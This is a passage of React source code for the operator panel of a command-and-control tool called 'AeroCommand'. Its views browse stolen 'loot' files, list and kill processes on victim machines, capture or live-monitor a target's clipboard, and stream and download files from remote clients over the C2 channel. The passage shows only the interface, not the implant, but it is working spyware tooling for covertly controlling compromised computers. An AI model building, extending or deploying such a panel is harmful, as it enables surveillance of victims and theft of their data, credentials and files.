                                  className="max-w-full max-h-full object-contain shadow-[0_0_50px_rgba(0,0,0,0.5)] border border-c2border rounded-lg" 
                                />
                              ) : (
                                <div className="text-slate-500 animate-pulse flex flex-col items-center space-y-3">
                                  <RefreshCw className="w-8 h-8 animate-spin" />
                                  <span className="text-[10px] font-bold uppercase tracking-widest">Decoding Image Data...</span>
                                </div>
                              )
                            ) : (
                              <div className="w-full h-full bg-slate-900 rounded-lg border border-c2border overflow-hidden flex flex-col">
                                <div className="p-2 bg-slate-800/50 border-b border-c2border text-[9px] font-mono text-slate-500 uppercase tracking-widest px-4">Raw File Content</div>
                                <pre className="flex-1 text-[10px] font-mono text-slate-400 p-6 overflow-auto whitespace-pre-wrap leading-relaxed">
                                  {lootContent ? atob(lootContent) : 'Loading content...'}
                                </pre>
                              </div>
                            )}
                          </div>
                        </>
                      ) : (
                        <div className="flex-1 flex flex-col items-center justify-center text-slate-600 space-y-4">
                          <div className="w-20 h-20 bg-slate-900 rounded-full flex items-center justify-center border border-c2border/30">
                            <Monitor className="w-10 h-10 opacity-20" />
                          </div>
                          <div className="text-[10px] font-bold uppercase tracking-[0.2em] opacity-40">Select a file to preview</div>
                        </div>
                      )}
                    </div>
                  </div>
                )}
              </div>
            </div>
          )}

          {/* 5. PROCESS MANAGER VIEW */}
          {activeTab === 'processes' && (
            <div className="h-full flex flex-col space-y-4">
              <div className="flex items-center justify-between">
                <div className="flex items-center space-x-3">
                  <h2 className="text-lg font-bold">Process Manager</h2>
                  <span className="text-[10px] bg-slate-800 text-slate-400 px-2 py-0.5 rounded border border-c2border/50 uppercase tracking-widest">
                    {processList.length} Processes
                  </span>
                </div>
                <div className="flex items-center space-x-2">
                  <div className="relative">
                    <Send className="absolute left-3 top-1/2 -translate-y-1/2 w-3 h-3 text-slate-500" />
                    <input 
                      type="text" 
                      placeholder="Search processes..." 
                      value={processSearch}
                      onChange={(e) => setProcessSearch(e.target.value)}
                      className="bg-slate-900 border border-c2border rounded-full pl-9 pr-4 py-1.5 text-xs w-64 focus:outline-none focus:border-c2accent/50 transition-colors"
                    />
                  </div>
                  <button 
                    onClick={fetchProcesses}
                    disabled={isProcessesLoading}
                    className="flex items-center space-x-2 px-3 py-1.5 bg-slate-800 hover:bg-slate-700 rounded-lg text-xs font-bold transition-colors border border-c2border disabled:opacity-50"
                  >
                    <RefreshCw className={`w-3 h-3 ${isProcessesLoading ? 'animate-spin' : ''}`} />
                    <span>REFRESH</span>
                  </button>
                </div>
              </div>

              <div className="flex-1 bg-c2card border border-c2border rounded overflow-hidden flex flex-col">
                <div className="overflow-y-auto flex-1">
                  <table className="w-full text-left border-collapse">
                    <thead className="sticky top-0 z-10">
                      <tr className="border-b border-c2border bg-slate-900 text-xs text-slate-400">
                        <th className="p-3 font-bold uppercase tracking-wider">Process Name</th>
                        <th className="p-3 font-bold uppercase tracking-wider">PID</th>
                        <th className="p-3 font-bold uppercase tracking-wider">Memory</th>
                        <th className="p-3 font-bold uppercase tracking-wider">User</th>
                        <th className="p-3 font-bold uppercase tracking-wider">Window Title</th>
                        <th className="p-3 font-bold uppercase tracking-wider text-right">Actions</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-c2border text-[11px] font-mono">
                      {isProcessesLoading && processList.length === 0 ? (
                        <tr>
                          <td colSpan={6} className="p-12 text-center text-slate-500">
                            <div className="flex flex-col items-center space-y-3">
                              <RefreshCw className="w-8 h-8 animate-spin opacity-20" />
                              <span className="text-[10px] font-bold uppercase tracking-[0.2em]">Gathering process list...</span>
                            </div>
                          </td>
                        </tr>
                      ) : (
                        processList
                          .filter(p => 
                            p.name.toLowerCase().includes(processSearch.toLowerCase()) || 
                            p.pid.includes(processSearch) ||
                            p.title.toLowerCase().includes(processSearch.toLowerCase())
                          )
                          .map((p, i) => (
                            <tr key={i} className="hover:bg-slate-800/30 group transition-colors">
                              <td className="p-3 text-slate-200 font-bold flex items-center space-x-2">
                                <Cpu className="w-3 h-3 text-c2accent opacity-50" />
                                <span>{p.name}</span>
                              </td>
                              <td className="p-3 text-slate-400">{p.pid}</td>
                              <td className="p-3 text-emerald-400/70">{p.mem}</td>
                              <td className="p-3 text-slate-500 truncate max-w-[120px]">{p.user}</td>
                              <td className="p-3 text-slate-400 italic truncate max-w-[200px]">{p.title || '-'}</td>
                              <td className="p-3 text-right">
                                <button 
                                  onClick={() => killProcess(p.pid)}
                                  className="px-2 py-1 bg-red-500/10 hover:bg-red-500 text-red-500 hover:text-white rounded text-[9px] font-bold transition-all border border-red-500/20 opacity-0 group-hover:opacity-100"
                                >
                                  KILL
                                </button>
                              </td>
                            </tr>
                          ))
                      )}
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
          )}

          {/* 6. CLIPBOARD VIEW */}
          {activeTab === 'clipboard' && (() => {
            // Extract all clipboard entries from logs (clip + clipwatch outputs)
            const clipEntries = logs
              .filter(l => l.status === 'SUCCESS' && (l.command === 'clip' || l.command === 'clipwatch' || l.command.startsWith('clip')))
              .filter(l => !l.output.startsWith('[JSON_') && l.output.trim().length > 0)
              .map(l => ({
                id: l.id,
                client: l.client_id,
                content: l.output.trim(),
                timestamp: l.timestamp,
              }))
              .reverse();

            const isWatching = logs.some(l => l.command === 'clipwatch' && l.status === 'SUCCESS') &&
              !logs.some(l => l.command === 'clipstop' && l.status === 'SUCCESS' &&
                logs.findIndex(x => x.command === 'clipwatch') < logs.findIndex(x => x.command === 'clipstop'));

            return (
              <div className="h-full flex flex-col space-y-3">
                {/* Header */}
                <div className="flex items-center justify-between">
                  <div>
                    <h2 className="text-sm font-bold text-white uppercase tracking-wider">Clipboard Stream</h2>
                    <p className="text-[11px] text-slate-400 mt-0.5">Live clipboard monitoring from remote endpoints</p>
                  </div>
                  <div className="flex items-center space-x-2">
                    <button
                      onClick={() => executeCommand('clip')}
                      disabled={clients.length === 0}
                      className="px-3 py-1.5 bg-c2pill border border-c2border hover:border-c2accent text-xs font-medium text-slate-300 hover:text-white rounded-md flex items-center space-x-1.5 transition-colors disabled:opacity-40 disabled:cursor-not-allowed"
                    >
                      <Clipboard className="w-3 h-3" />
                      <span>Grab Once</span>
                    </button>
                    <button
                      onClick={() => executeCommand(isWatching ? 'clipstop' : 'clipwatch')}
                      disabled={clients.length === 0}
                      className={`px-3 py-1.5 text-xs font-semibold rounded-md flex items-center space-x-1.5 border transition-colors disabled:opacity-40 disabled:cursor-not-allowed ${
                        isWatching
                          ? 'bg-rose-500/10 text-rose-400 border-rose-500/30 hover:bg-rose-500/20'
                          : 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30 hover:bg-emerald-500/20'
                      }`}
                    >
                      <span className={`w-1.5 h-1.5 rounded-full ${isWatching ? 'bg-rose-400 animate-pulse' : 'bg-emerald-400'}`} />
                      <span>{isWatching ? 'Stop Monitor' : 'Start Monitor'}</span>
                    </button>
                  </div>
                </div>

                {/* Status banner */}
                {isWatching && (
                  <div className="flex items-center space-x-2 px-3 py-2 bg-emerald-500/5 border border-emerald-500/20 rounded-lg text-[11px] text-emerald-400">
                    <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse shrink-0" />
                    <span>Live clipboard monitor is active — every clipboard change on the target will appear below</span>
                  </div>
                )}

                {/* Clipboard feed */}
                <div className="flex-1 bg-c2card border border-c2border rounded-xl overflow-y-auto">
                  {clipEntries.length === 0 ? (
                    <div className="h-full flex flex-col items-center justify-center space-y-3 text-slate-500 p-12">
                      <Clipboard className="w-10 h-10 opacity-20" />
                      <div className="text-xs text-center space-y-1">
                        <p className="font-semibold">No clipboard data yet</p>
                        <p className="text-slate-600">Use <span className="font-mono text-slate-400">Grab Once</span> for a one-time capture, or <span className="font-mono text-slate-400">Start Monitor</span> to stream changes live</p>
                      </div>
                    </div>
                  ) : (
                    <div className="divide-y divide-c2border">
                      {clipEntries.map((entry, i) => (
                        <div key={entry.id} className="p-3.5 hover:bg-c2pill/40 transition-colors group">
                          <div className="flex items-start justify-between gap-3">
                            <div className="flex items-start space-x-2.5 min-w-0 flex-1">
                              <div className="mt-0.5 p-1.5 rounded-md bg-amber-500/10 border border-amber-500/20 shrink-0">
                                <Clipboard className="w-3 h-3 text-amber-400" />
                              </div>
                              <div className="min-w-0 flex-1">
                                <div className="flex items-center space-x-2 mb-1">
                                  <span className="text-[9px] font-bold uppercase tracking-wider px-1.5 py-0.5 rounded bg-amber-500/10 border border-amber-500/20 text-amber-400">CLIPBOARD</span>
                                  <span className="text-[10px] font-mono text-slate-500">{entry.client}</span>
                                  <span className="text-[10px] font-mono text-slate-600">{entry.timestamp.split(' ')[1] || entry.timestamp}</span>
                                </div>
                                <pre className="text-xs text-slate-200 font-mono whitespace-pre-wrap break-all leading-relaxed max-h-32 overflow-y-auto">{entry.content}</pre>
                              </div>
                            </div>
                            <button
                              onClick={() => navigator.clipboard.writeText(entry.content)}
                              className="shrink-0 p-1.5 rounded-md text-slate-500 hover:text-white hover:bg-c2pill border border-transparent hover:border-c2border transition-colors opacity-0 group-hover:opacity-100"
                              title="Copy to local clipboard"
                            >
                              <Copy className="w-3 h-3" />
                            </button>
                          </div>
                        </div>
                      ))}
                    </div>
                  )}
                </div>

                <div className="text-[10px] text-slate-600 font-mono">
                  {clipEntries.length} capture{clipEntries.length !== 1 ? 's' : ''} recorded this session
                </div>
              </div>
            );
          })()}

          {/* 6. DATABASE VIEW */}
          {activeTab === 'database' && (
            <div className="space-y-4">
              <h2 className="text-lg font-bold">Command Logs</h2>
              <div className="bg-c2card border border-c2border rounded overflow-hidden">
                <table className="w-full text-left border-collapse">
                  <thead>
                    <tr className="border-b border-c2border bg-slate-900/50 text-xs text-slate-400">
                      <th className="p-3">ID</th>
                      <th className="p-3">Client</th>
                      <th className="p-3">Command</th>
                      <th className="p-3">Timestamp</th>
                      <th className="p-3">Status</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-c2border text-sm font-mono text-xs">
                    {logs.map((l, i) => (
                      <tr key={i} className="hover:bg-slate-800/50">
                        <td className="p-3">#{l.id}</td>
                        <td className="p-3 text-c2accent">{l.client_id}</td>
                        <td className="p-3">{l.command}</td>
                        <td className="p-3 text-slate-400">{l.timestamp}</td>
                        <td className="p-3 text-emerald-400">{l.status}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          )}

          {/* 7. SETTINGS VIEW */}
          {activeTab === 'settings' && (
            <div className="space-y-6 max-w-xl">
              <h2 className="text-lg font-bold">Server Configuration</h2>
              <div className="bg-c2card border border-c2border p-6 rounded space-y-4">
                <div>
                  <label className="block text-xs font-semibold text-slate-400 mb-1">C2 Server Port</label>
                  <input type="text" value={serverPort} readOnly className="w-full bg-slate-900 border border-c2border rounded px-3 py-2 text-sm font-mono opacity-50" />
                </div>
              </div>
            </div>
          )}

        </main>
      </div>

      {/* ==================== INSTANT FILE PREVIEW MODAL ==================== */}
      {previewOpen && (
        <div 
          className="fixed inset-0 z-[100] flex items-center justify-center p-4 sm:p-6 md:p-10 bg-slate-950/80 backdrop-blur-md animate-in fade-in duration-200"
          onClick={(e) => {
            if (e.target === e.currentTarget) setPreviewOpen(false);
          }}
        >
          <div className="w-full max-w-4xl max-h-[88vh] bg-c2sidebar border border-c2border rounded-xl shadow-2xl flex flex-col overflow-hidden animate-in zoom-in-95 duration-200">
            {/* Modal Header */}
            <div className="px-5 py-3.5 border-b border-c2border bg-slate-900/60 flex items-center justify-between">
              <div className="flex items-center space-x-3 min-w-0 flex-1">
                <div className="p-2 rounded-lg bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 shrink-0">
                  {previewData?.type === 'image' ? (
                    <ImageIcon className="w-5 h-5" />
                  ) : previewData?.type === 'text' ? (
                    <FileText className="w-5 h-5" />
                  ) : (
                    <FileGeneric className="w-5 h-5" />
                  )}
                </div>
                <div className="min-w-0 flex-1">
                  <div className="flex items-center space-x-2">
                    <h3 className="text-sm font-bold text-slate-100 truncate">{previewData?.name || 'File Preview'}</h3>
                    {previewData?.type && (
                      <span className="px-2 py-0.5 rounded text-[9px] font-bold uppercase tracking-wider bg-slate-800 border border-c2border text-c2accent">
                        {previewData.type}
                      </span>
                    )}
                    {previewData?.size && (
                      <span className="text-[10px] font-mono text-slate-400">{previewData.size}</span>
                    )}
                  </div>
                  <div className="text-[10px] font-mono text-slate-500 truncate mt-0.5">{previewData?.path}</div>
                </div>
              </div>

              {/* Action Buttons */}
              <div className="flex items-center space-x-2 shrink-0 ml-4">
                {/* Zoom Controls for Images */}
                {previewData?.type === 'image' && !isPreviewLoading && (
                  <div className="flex items-center space-x-1 bg-slate-800/80 border border-c2border rounded p-0.5 mr-1">
                    <button
                      onClick={() => setPreviewZoom(z => Math.max(0.25, z - 0.25))}
                      className="p-1 hover:bg-slate-700 text-slate-300 rounded transition-colors"
                      title="Zoom Out"
                    >
                      <ZoomOut className="w-3.5 h-3.5" />
                    </button>
                    <span className="text-[10px] font-mono px-1.5 text-slate-400">{Math.round(previewZoom * 100)}%</span>
                    <button
                      onClick={() => setPreviewZoom(z => Math.min(3, z + 0.25))}
                      className="p-1 hover:bg-slate-700 text-slate-300 rounded transition-colors"
                      title="Zoom In"
                    >
                      <ZoomIn className="w-3.5 h-3.5" />
                    </button>
                    {previewZoom !== 1 && (
                      <button
                        onClick={() => setPreviewZoom(1)}
                        className="text-[9px] font-bold text-c2accent px-1 hover:underline"
                        title="Reset Zoom"
                      >
                        Reset
                      </button>
                    )}
                  </div>
                )}

                {/* Copy Path */}
                <button
                  onClick={() => {
                    if (previewData?.path) {
                      navigator.clipboard.writeText(previewData.path);
                      setCopiedPath(true);
                      setTimeout(() => setCopiedPath(false), 2000);
                    }
                  }}
                  className="px-2.5 py-1.5 bg-slate-800 hover:bg-slate-700 border border-c2border rounded text-xs font-semibold text-slate-300 flex items-center space-x-1.5 transition-colors"
                  title="Copy absolute path"
                >
                  {copiedPath ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                  <span>{copiedPath ? 'Copied' : 'Path'}</span>
                </button>

                {/* Download */}
                <button
                  onClick={() => {
                    if (previewData?.path) {
                      executeCommand(`download "${previewData.path}"`);
                    }
                  }}
                  className="px-2.5 py-1.5 bg-c2accent/20 hover:bg-c2accent/30 border border-c2accent/40 rounded text-xs font-semibold text-c2accent flex items-center space-x-1.5 transition-colors"
                  title="Download full file to Loot"
                >
                  <Download className="w-3.5 h-3.5" />
                  <span>Download</span>
                </button>

                {/* Close Button */}
                <button
                  onClick={() => setPreviewOpen(false)}
                  className="p-1.5 hover:bg-rose-500/20 hover:text-rose-400 text-slate-400 rounded-lg transition-colors"
                  title="Close (Esc)"
                >
                  <X className="w-5 h-5" />
                </button>
              </div>
            </div>

            {/* Modal Body */}
            <div className="flex-1 overflow-auto p-4 flex items-center justify-center min-h-[360px] max-h-[70vh] bg-slate-950/40">
              {isPreviewLoading ? (
                <div className="flex flex-col items-center justify-center space-y-3 p-12 text-slate-400">
                  <div className="relative">
                    <div className="w-12 h-12 rounded-full border-2 border-c2accent/20 border-t-c2accent animate-spin" />
                    <Eye className="w-5 h-5 text-c2accent absolute inset-0 m-auto" />
                  </div>
                  <div className="text-xs font-semibold">Streaming preview from remote client...</div>
                  <div className="text-[10px] text-slate-500 font-mono">Fetching payload over encrypted C2</div>
                </div>
              ) : previewData?.status === 'error' ? (
                <div className="p-8 text-center max-w-md">
                  <div className="w-12 h-12 rounded-full bg-rose-500/10 border border-rose-500/30 text-rose-400 flex items-center justify-center mx-auto mb-3">
                    <ShieldCheck className="w-6 h-6" />
                  </div>
                  <h4 className="text-sm font-bold text-slate-200 mb-1">Preview Unavailable</h4>
                  <p className="text-xs text-rose-400 font-mono">{previewData.message || 'Could not read file.'}</p>
                </div>
              ) : previewData?.type === 'image' && previewData.data ? (
                <div 
                  className="w-full h-full flex items-center justify-center overflow-auto p-4 rounded-lg"
                  style={{ 
                    backgroundImage: 'radial-gradient(#334155 1px, transparent 1px)', 
                    backgroundSize: '16px 16px',
                    backgroundColor: '#090d16'
                  }}
                >
                  <img
                    src={`data:${previewData.mime || 'image/png'};base64,${previewData.data}`}
                    alt={previewData.name || 'Preview'}
                    style={{ transform: `scale(${previewZoom})`, transformOrigin: 'center center' }}
                    className="max-h-[60vh] max-w-full object-contain rounded shadow-2xl transition-transform duration-150 select-none border border-slate-800"
                  />
                </div>
              ) : previewData?.type === 'text' && previewData.content !== undefined ? (
                <div className="w-full h-full flex flex-col bg-slate-900/90 rounded-lg border border-c2border overflow-hidden">
                  <div className="px-3 py-1.5 bg-slate-800/80 border-b border-c2border text-[10px] font-mono text-slate-400 flex items-center justify-between">
                    <span>Document View</span>
                    <span>UTF-8 Text</span>
                  </div>
                  <pre className="flex-1 p-4 overflow-auto font-mono text-xs text-slate-200 leading-relaxed whitespace-pre-wrap select-text">
                    {previewData.content}
                  </pre>
                </div>
              ) : previewData?.status === 'unsupported' ? (
                <div className="p-8 text-center max-w-md space-y-4">
                  <div className="w-12 h-12 rounded-full bg-slate-800 border border-c2border text-slate-400 flex items-center justify-center mx-auto">
                    <FileGeneric className="w-6 h-6" />
                  </div>
                  <div>
                    <h4 className="text-sm font-bold text-slate-200 mb-1">Binary File</h4>
                    <p className="text-xs text-slate-400">
                      {previewData.message || 'Direct visual preview is not supported for this format.'}
                    </p>
                  </div>
                  <button
                    onClick={() => previewData.path && executeCommand(`download "${previewData.path}"`)}
                    className="px-4 py-2 bg-c2accent text-slate-900 rounded font-bold text-xs hover:opacity-90 transition-opacity inline-flex items-center space-x-2"
                  >
                    <Download className="w-4 h-4" />
                    <span>Download Complete File</span>
                  </button>
                </div>
              ) : (
                <div className="text-slate-500 text-xs italic">No preview data</div>
              )}
            </div>

            {/* Modal Footer */}
            <div className="px-5 py-2.5 border-t border-c2border bg-slate-900/40 text-[10px] text-slate-500 flex items-center justify-between">
              <span>Press <kbd className="px-1.5 py-0.5 bg-slate-800 border border-c2border rounded font-mono text-slate-300">ESC</kbd> to close</span>
              <span>AeroCommand Live Stream Engine</span>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
